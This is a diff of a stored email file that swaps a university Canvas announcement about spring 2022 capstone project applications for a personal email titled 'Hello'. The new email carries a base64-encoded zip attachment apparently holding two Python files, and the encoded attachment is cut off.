@@ -1,223 +1,233 @@
-Return-Path: <umji@sjtu.edu.cn>
-Received: from proxy01.sjtu.edu.cn (LHLO proxy01.sjtu.edu.cn)
- (202.112.26.54) by mstore111.sjtu.edu.cn with LMTP; Mon, 29 Nov 2021
- 14:27:05 +0800 (CST)
+Return-Path: <yangyiwen.sigo@hotmail.com>
+Received: from mta02.sjtu.edu.cn (LHLO mta02.sjtu.edu.cn) (202.121.179.6) by
+ mstore111.sjtu.edu.cn with LMTP; Tue, 30 Nov 2021 22:25:11 +0800 (CST)
 Received: from localhost (localhost [127.0.0.1])
-	by proxy01.sjtu.edu.cn (Postfix) with ESMTP id B392020426A4C
-	for <shangyuliuchang@sjtu.edu.cn>; Mon, 29 Nov 2021 14:27:02 +0800 (CST)
-X-Virus-Scanned: amavisd-new at proxy01.sjtu.edu.cn
-Received: from proxy01.sjtu.edu.cn ([127.0.0.1])
-	by localhost (proxy01.sjtu.edu.cn [127.0.0.1]) (amavisd-new, port 10026)
-	with ESMTP id uxVva0XMcV2Q for <shangyuliuchang@sjtu.edu.cn>;
-	Mon, 29 Nov 2021 14:27:02 +0800 (CST)
-Received: from sjtu.edu.cn (unknown [47.93.48.166])
-	(Authenticated sender: umji)
-	by proxy01.sjtu.edu.cn (Postfix) with ESMTPSA id 7F904204269AC
-	for <shangyuliuchang@sjtu.edu.cn>; Mon, 29 Nov 2021 14:26:56 +0800 (CST)
-Date: Mon, 29 Nov 2021 14:26:56 +0800
-From: UM-SJTU JI Canvas <umji@sjtu.edu.cn>
-Reply-To: umji+5d15a017239e7f79f7259c8b776456f889b10294-1~7706707@sjtu.edu.cn
-To: shangyuliuchang@sjtu.edu.cn
-Message-ID: <61a472b074443_5572ce50a419601a0@canvas.mail>
-Subject: 3rd Round Application for 5 VE/VM/MSE 490 Projects in Spring 2022
- (Due by 15pm, Nov 30, Tuesday): Undergraduate Students
-Mime-Version: 1.0
-Content-Type: multipart/alternative;
- boundary="--==_mimepart_61a472b073c42_5572ce50a419600f7";
- charset=UTF-8
-Content-Transfer-Encoding: 7bit
-Auto-Submitted: auto-generated
+	by mta02.sjtu.edu.cn (Postfix) with ESMTP id A2FB426B203
+	for <shangyuliuchang@sjtu.edu.cn>; Tue, 30 Nov 2021 22:25:11 +0800 (CST)
+Authentication-Results: mta02.sjtu.edu.cn (amavisd-new);
+	dkim=pass (2048-bit key) header.d=hotmail.com
+Received: from mta02.sjtu.edu.cn ([127.0.0.1])
+	by localhost (mta02.sjtu.edu.cn [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id NYgUIh75mKT3 for <shangyuliuchang@sjtu.edu.cn>;
+	Tue, 30 Nov 2021 22:25:11 +0800 (CST)
+Received: from spamtitan01.sjtu.edu.cn (unknown [202.120.0.8])
+	by mta02.sjtu.edu.cn (Postfix) with ESMTPS id 7B1E826B202
+	for <shangyuliuchang@sjtu.edu.cn>; Tue, 30 Nov 2021 22:25:11 +0800 (CST)
+Received: from localhost (localhost [127.0.0.1])
+	by spamtitan01.sjtu.edu.cn (Postfix) with ESMTP id 7A986238389E
+	for <shangyuliuchang@sjtu.edu.cn>; Tue, 30 Nov 2021 14:25:11 +0000 (UTC)
+X-Virus-Scanned: by SpamTitan at sjtu.edu.cn
+Received: from spamtitan01.sjtu.edu.cn (localhost [127.0.0.1])
+	by spamtitan01.sjtu.edu.cn (Postfix) with ESMTP id 7BF5A23839C0
+	for <shangyuliuchang@sjtu.edu.cn>; Tue, 30 Nov 2021 14:25:07 +0000 (UTC)
+Authentication-Results: spamtitan01.sjtu.edu.cn;
+        arc=pass (as.1.microsoft.com=pass, ams.1.microsoft.com=pass)
+          smtp.remote-ip=40.92.99.59;
+        dkim=pass (2048-bit rsa key sha256) header.d=hotmail.com
+          header.i=@hotmail.com header.b=W9h9AvCV header.a=rsa-sha256
+          header.s=selector1 x-bits=2048;
+        spf=pass smtp.mailfrom=yangyiwen.sigo@hotmail.com
+          smtp.helo=JPN01-TYC-obe.outbound.protection.outlook.com
+Received-SPF: pass
+        (hotmail.com: Sender is authorized to use 'yangyiwen.sigo@hotmail.com' in 'mfrom' identity (mechanism 'include:spf.protection.outlook.com' matched))
+        receiver=spamtitan01.sjtu.edu.cn;
+        identity=mailfrom;
+        envelope-from="yangyiwen.sigo@hotmail.com";
+        helo=JPN01-TYC-obe.outbound.protection.outlook.com;
+        client-ip=40.92.99.59
+Received: from JPN01-TYC-obe.outbound.protection.outlook.com (unknown [40.92.99.59])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by spamtitan01.sjtu.edu.cn (Postfix) with ESMTPS id 3635E23839D1
+	for <shangyuliuchang@sjtu.edu.cn>; Tue, 30 Nov 2021 14:25:06 +0000 (UTC)
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=d2XkGkA71YRT7CfTttP2hPmcq6nnHMXEx/LHwy4UDPrS5QZ/BsbyvN4dNIWcVRwCEQp1wMjIMGvV/8KFyCdo2BSBmaq8JY2MBQHiZjMmP+vTJ3U1bjwcHuJZwZhxfdibRayTGlDfy/3JZytMLeopnNLjbiyyeH/IbnrkjoP6GFv5eqHSJ2Eh5q7T5+9WQbLDoCBHPowEa9kj8QGB8cs8rhUkIP1AfV5qGG64RzralhGzUMUpMEKj1tOOVmKKqC3BqH44NONqenski2b3Y3FKKEsYYJqv3rMt4+jX35tUifRqgLvZox8Hl//AYYU+NDh//CinqB/3ELVUg7foLWQKaw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=bh+WZ2u5ECHjDuIhmX3xAwppCHU4pRMZJUL0begOAfA=;
+ b=mRfVQ1jGmplw21fD5CZPGroaZC1WrsdD3h20kf8Gw92f5bGFEECBFdG2A7w+HKQ0hOGOBlt4eEUXDpEJ3kgkcSWgbVLJmBBy1iZtvL8JUjkXUC+5Seps34LIOAZeAXiQPKiAFyQ5bbRtFyUoHToJkLknVo0aV61pzEBPyaUEdXOsUNlcwlP8jkglX4cvteocQM/ASDaYlsqWJpiMh/kHcgKk76Xyv/YjE6P3gFU3pyJbMVV/flaUaR0Cf3HxEWGQRmyHiBQGjtxlvWz13l3AXRsXvm/IrlaEz7+qoLS4+mfiLSCpCxADcz+1gUSgdquZnzhI09fIwEBDVhFb1pHZ5A==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=bh+WZ2u5ECHjDuIhmX3xAwppCHU4pRMZJUL0begOAfA=;
+ b=W9h9AvCVHP03eHm6M09njN7j1parJTw+7XfOK30u5bHc6EQG3J24tRewLZNgjv97JT2lrus9Oc4/GAJgIK+wUdQkqQsaecL9Y8AzucLNjeGZ4DQ25z8UxZ8wqG6LcSKJUxaR58dx2hrzVBUiBpLduWKWSs3wiburYSEjRUjvS2Y8mjGAnQIqjM3cPpJaKnziXYJXhYjUXUfqhTFFm8YuYwODE+20GPCosTwmsK8MaQmm7jwQHPjvf44N45M/v9RifZzdm4t5A6WVA4PoMNIj4cYbybDeqbx0EIlKdrPO17WmW9E/ST0OyeMY+SKOEwbODtQXFQtSDL5fn3xoRLXH0Q==
+Received: from OSBPR01MB3832.jpnprd01.prod.outlook.com (2603:1096:604:45::23)
+ by OS3PR01MB5653.jpnprd01.prod.outlook.com (2603:1096:604:c4::7) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4734.20; Tue, 30 Nov
+ 2021 14:25:02 +0000
+Received: from OSBPR01MB3832.jpnprd01.prod.outlook.com
+ ([fe80::fcc5:fe74:b4c2:8799]) by OSBPR01MB3832.jpnprd01.prod.outlook.com
+ ([fe80::fcc5:fe74:b4c2:8799%4]) with mapi id 15.20.4734.024; Tue, 30 Nov 2021
+ 14:25:02 +0000
+Date: Tue, 30 Nov 2021 22:24:47 +0800
+From: =?UTF-8?b?5qWK5q+F5paH?= <yangyiwen.sigo@hotmail.com>
+Subject: Hello
+To: shangyuliuchang <shangyuliuchang@sjtu.edu.cn>
+Message-ID:
+ <OSBPR01MB383254D86C919255AA51C0D58E679@OSBPR01MB3832.jpnprd01.prod.outlook.com>
+X-Mailer: geary/40.0
+Content-Type: multipart/mixed; boundary="=-WY+qcqnL6cMAWgCk4f3K"
+X-TMN: [WxSRo60V1Aw0AjG7vdb9MTt9pGCv7psr]
+X-ClientProxiedBy: SJ0PR13CA0034.namprd13.prod.outlook.com
+ (2603:10b6:a03:2c2::9) To OSBPR01MB3832.jpnprd01.prod.outlook.com
+ (2603:1096:604:45::23)
+X-Microsoft-Original-Message-ID: <BP2E3R.VMI98HMHKICQ1@hotmail.com>
+MIME-Version: 1.0
+X-MS-Exchange-MessageSentRepresentingType: 1
+Received: from [127.0.0.1] (59.78.31.168) by SJ0PR13CA0034.namprd13.prod.outlook.com (2603:10b6:a03:2c2::9) with Microsoft SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4755.10 via Frontend Transport; Tue, 30 Nov 2021 14:25:00 +0000
+X-MS-PublicTrafficType: Email
+X-MS-Office365-Filtering-Correlation-Id: 583e420e-2a72-4b89-0a36-08d9b40d324b
+X-MS-TrafficTypeDiagnostic: OS3PR01MB5653:
+X-Microsoft-Antispam: BCL:0;
+X-Microsoft-Antispam-Message-Info:
+	sa5dUgC3M6878IefVAR4AYiVGGM1L7RPq7jFHMC4sav61/vfyiK7tuMDX71FvPHQlUTjyBBKGusex3GRg0ixPM5f4sQKHOfCiCAV7sRn822t1rgvLkluSlLapeZWvpfTChm0lr8jG4oYgMcpFY66XiuvIM/CSup2fVjIlrbyVBVStcKSZM4IYNDRyDfbqjtpi0BuuIY4uXUnxYTU7u1TAFWrAd/5iBP4cY22C0cuQLPwE75fo+T/fRhWo5U6qHdib11ldhdRgdSK0iU9IGRTkw==
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?us-ascii?Q?0W3ovHv9D4bg2VeMsZzXm9eNcYqDjrNSzjW42b1LDAiaI6MvqgFOJYXVTuiI?=
+ =?us-ascii?Q?2vElsZTdg62F76n4FPclWpSfwiWQKVjX+L1N8bWSyP4gEnkR7T21GfrKzD/T?=
+ =?us-ascii?Q?xzV8P5uZn7ySrHbCpSsQlIFnJjSQ21BYbR/fIKeKbVhWjZyCQcNsnXt0+pL7?=
+ =?us-ascii?Q?LPoFKAry5IXD3dSeEcPLBKo5LBB1JQFGC7X/3QzxW7wSN8MMdb6U0UGMTagX?=
+ =?us-ascii?Q?E514kB0szEumj9fXThiPvgDHTPbnCm0A6r4WzwfM7y4/4oNjAkxZy4zQmid4?=
+ =?us-ascii?Q?BUqwuB01KZrZghh7pxVLmqlVW01hGkiivQp9N4mFtvGl2t+pAmbgDpQsL/q5?=
+ =?us-ascii?Q?qTCXRMU2MwjgSeNsoDmyJyXfTpD0+Buwl4Zg5XU28ZEASJ5SH8RMaZEBDBP7?=
+ =?us-ascii?Q?QS8YrwBLTJB4mcRnPjIAN88WJKEZPde9ImKsTtdV5EpGtx0cTNh9U7phr4T2?=
+ =?us-ascii?Q?5r7sv+gFkWyuqeFpPYdzkqLsj6LMWB5fAL5Vv1CGsVi9z8HyXZUiMjQXSssu?=
+ =?us-ascii?Q?tHJGQbAOxXn/ce0V5OYeIS9bYkFhTqINNCgfY0UUpvfpnJFSG/1xXb++Whzh?=
+ =?us-ascii?Q?iHpjUg3pM9CvyMtzFVKDs1pEGzgqiuTo6mrq9NT+6IUwlEtKtVNaCopUuv55?=
+ =?us-ascii?Q?XmeplY9PTr7obRVXWOLGvPkI4UcqqdJvT/AGVcTBRQnj19hSOaDXZCEDynSD?=
+ =?us-ascii?Q?eqaU0gRyRD2UBXMUr4AyF6JO6U4y6BdGb8FjIAAXCseKyIzq7rmJCrJOIVNM?=
+ =?us-ascii?Q?BuaIH2vewfykBRPuvkjDsXVzvRHAbpQw4jG/ngGDqZm9aZ2MiJpr6H9Fup1S?=
+ =?us-ascii?Q?71YSK/0V0WoadlCKEqppSnH0WpQVsPPrW1Fgg7Ic+AXtvAotBs0JtrAV2Mmh?=
+ =?us-ascii?Q?C3Va9J/kaDEBwOevIS63lS+EfizM0UJS7CQarsAN7ZYy4JWYiAAYKx94VJIu?=
+ =?us-ascii?Q?zQk0kKpYs71zt41P1jskcQ=3D=3D?=
+X-OriginatorOrg: sct-15-20-3174-20-msonline-outlook-77583.templateTenant
+X-MS-Exchange-CrossTenant-Network-Message-Id: 583e420e-2a72-4b89-0a36-08d9b40d324b
+X-MS-Exchange-CrossTenant-AuthSource: OSBPR01MB3832.jpnprd01.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 30 Nov 2021 14:25:02.5446
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
+	00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: OS3PR01MB5653
 
-
-----==_mimepart_61a472b073c42_5572ce50a419600f7
-Content-Type: text/plain;
- charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-
-          2nd Round application for Project #1 #2 #9
-
-[1 Design and Design Automation for Emerging Computing Paradigms_Weikang =
-Qian_22SP-1.pdf](https://umjicanvas.com/courses/7/files/609382/download?w=
-rap=3D1)
-
-[2 Hot Gas Atomization of Metal Droplet for Powder Production_Zhaoguang W=
-ang_22SP-2.pdf](https://umjicanvas.com/courses/7/files/609383/download?wr=
-ap=3D1)
-
-[9 Measuring throughput imbalance between the cloud and the public Intern=
-et_Yibo Pi_22SP-1.pdf](https://umjicanvas.com/courses/7/files/609384/down=
-load?wrap=3D1)
-
-=C2=A0
-
-Please take action=C2=A0before=C2=A0Nov 30, 15:00 PM, Tuesday.=C2=A0
-
-Please apply through this link:=C2=A0
-
-[http://z39jk3avhcn3fjeg.mikecrm.com/PgoXUfV](http://z39jk3avhcn3fjeg.mik=
-ecrm.com/PgoXUfV)
-
-=C2=A0
-
-=C2=A0
-
-For regulations and detailed information about VE/VM/MSE 490, please see =
-the previous announcement:
-
-[https://www.umjicanvas.com/courses/7/discussion_topics/39904](https://um=
-jicanvas.com/courses/7/discussion_topics/39904)
-
-=C2=A0[3rd-2.png](https://umjicanvas.com/courses/7/files/609386/preview)
-
-=C2=A0
-
-=C2=A0
-
-Thanks for your attention!
-
-=C2=A0
-
-Luca Meng
-
-Undergraduate Education Office
-
-=C2=A0
-
-=C2=A0
-
-
-https://umjicanvas.com/courses/7/announcements/40086
-
-
-
-
-
-
-          ________________________________________
-
-          You received this email because you are participating in one or=
- more classes using Canvas.  To change or turn off email notifications, v=
-isit:
-https://umjicanvas.com/profile/communication
-
-
-----==_mimepart_61a472b073c42_5572ce50a419600f7
-Content-Type: text/html;
- charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-
-<html>
-<body style=3D"background-color: #FFFFFF;">
-
-<center>
-  <table cellpadding=3D"8" cellspacing=3D"0" style=3D"margin: 0; padding:=
- 0; width:728px;" border=3D"0">
-    <tr>
-      <td valign=3D"top">
-        <table cellpadding=3D"0" cellspacing=3D"0" align=3D"center" style=
-=3D"background-color: #ffffff;">
-          <tr>
-            <td>
-              <table cellpadding=3D"0" cellspacing=3D"0" style=3D"" borde=
-r=3D"0" align=3D"center">
-                <tr>
-                  <td colspan=3D"3" height=3D"36"></td>
-                </tr>
-                <tr>
-                  <td width=3D"36"></td>
-                  <td width=3D"454" style=3D"font-size: 14px; color: #444=
-444; font-family: 'Open Sans', 'Lucida Grande', 'Segoe UI', Arial, Verdan=
-a, 'Lucida Sans Unicode', Tahoma, 'Sans Serif'; border-collapse: collapse=
-;" align=3D"left" valign=3D"top">
-
-                    =
-
-<p><strong>2nd Round application for Project #1 #2 #9</strong></p>
-<p><strong><a href=3D"https://umjicanvas.com//courses/7/files/609382/down=
-load?wrap=3D1" rel=3D"nofollow">1 Design and Design Automation for Emergi=
-ng Computing Paradigms_Weikang Qian_22SP-1.pdf</a></strong></p>
-<p><strong><a href=3D"https://umjicanvas.com//courses/7/files/609383/down=
-load?wrap=3D1" rel=3D"nofollow">2 Hot Gas Atomization of Metal Droplet fo=
-r Powder Production_Zhaoguang Wang_22SP-2.pdf</a></strong></p>
-<p><strong><a href=3D"https://umjicanvas.com//courses/7/files/609384/down=
-load?wrap=3D1" rel=3D"nofollow">9 Measuring throughput imbalance between =
-the cloud and the public Internet_Yibo Pi_22SP-1.pdf</a></strong></p>
-<p>=C2=A0</p>
-<p>Please take action=C2=A0<em>before=C2=A0<strong>Nov 30, 15:00 PM, Tues=
-day</strong>.=C2=A0</em></p>
-<p>Please apply through this link:=C2=A0</p>
-<p><a href=3D"http://z39jk3avhcn3fjeg.mikecrm.com/PgoXUfV" rel=3D"nofollo=
-w">http://z39jk3avhcn3fjeg.mikecrm.com/PgoXUfV</a></p>
-<p>=C2=A0</p>
-<p>=C2=A0</p>
-<p>For regulations and detailed information about VE/VM/MSE 490, please s=
-ee the previous announcement:</p>
-<p><a href=3D"https://umjicanvas.com//courses/7/discussion_topics/39904" =
-rel=3D"nofollow">https://www.umjicanvas.com/courses/7/discussion_topics/3=
-9904</a></p>
-<p>=C2=A0</p>
-<p>=C2=A0</p>
-<p>=C2=A0</p>
-<p>Thanks for your attention!</p>
-<p>=C2=A0</p>
-<p>Luca Meng</p>
-<p>Undergraduate Education Office</p>
-<p>=C2=A0</p>
-<p>=C2=A0</p>
+--=-WY+qcqnL6cMAWgCk4f3K
+Content-Type: text/plain; charset=us-ascii; format=flowed
 
 
 
-                  </td>
-                  <td width=3D"36"></td>
-                </tr>
-                <tr>
-                  <td colspan=3D"3" height=3D"36"></td>
-                </tr>
-              </table>
-            </td>
-          </tr>
-        </table>
-        <table cellpadding=3D"0" cellspacing=3D"0" align=3D"center" borde=
-r=3D"0" style=3D"background-color: #ffffff;">
-          <tr>
-            <td height=3D"60"></td>
-          </tr>
-          <tr>
-            <td align=3D"center"> <img src=3D"https://lh3.googleuserconte=
-nt.com/D1pgZeJZrBFc_n_EnEWpj9BQpVUaQ6xj2FYl1ZaxhDN4c-x8X69DqfJ258Eb0u7sXy=
-uvYI533FkaCouBv6131tpxMbd1CpjZDEMr2kN4t8_Epitm77c" alt=3D""></td>
-          </tr>
-          <tr>
-            <td height=3D"15"></td>
-          </tr>
-          <tr>
-            <td style=3D"padding: 0; border-collapse: collapse;">
-              <table cellpadding=3D"0" cellspacing=3D"0" align=3D"center"=
- border=3D"0">
-                <tr style=3D"font-size: 11px; color: #a8b9c6; background-=
-color: #ffffff; font-family: 'Open Sans', 'Lucida Grande', 'Segoe UI', Ar=
-ial, Verdana, 'Lucida Sans Unicode', Tahoma, 'Sans Serif';" valign=3D"top=
-">
-                    <td width=3D"375" align=3D"center">
-                    <a href=3D"https://umjicanvas.com/courses/7/announcem=
-ents/40086">
-    View announcement
-  </a></td>
-                    <td width=3D"50" align=3D"center"> | </td>
-                  <td width=3D"375" align=3D"center"><a href=3D"https://u=
-mjicanvas.com/profile/communication">
-                    Update your notification settings</a></td>
-                </tr>
-              </table>
-            </td>
-          </tr>
-        </table>
-      </td>
-    </tr>
-  </table>
-</center>
-</body>
-</html>
 
-----==_mimepart_61a472b073c42_5572ce50a419600f7--
+--=-WY+qcqnL6cMAWgCk4f3K
+Content-Type: application/zip
+Content-Disposition: attachment; filename=canvas.zip
+Content-Transfer-Encoding: base64
+
+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
